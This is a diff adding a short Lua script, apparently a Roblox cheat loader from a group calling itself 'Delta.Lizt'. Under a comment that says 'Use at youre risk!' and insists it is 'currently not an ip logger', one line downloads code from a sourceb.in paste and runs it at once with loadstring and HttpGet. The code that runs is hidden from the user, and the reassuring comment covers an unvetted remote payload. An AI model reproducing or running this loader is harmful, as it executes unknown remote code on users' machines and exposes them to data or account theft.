@@ -1,0 +1,7 @@
+--[[
+  Use at youre risk!
+  We Are currently not an ip logger
+  if you didn't seeing this message, please tell them its fake!
+  Delta.Lizt GG
+]]
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/gOEaxqww0k/0"))()
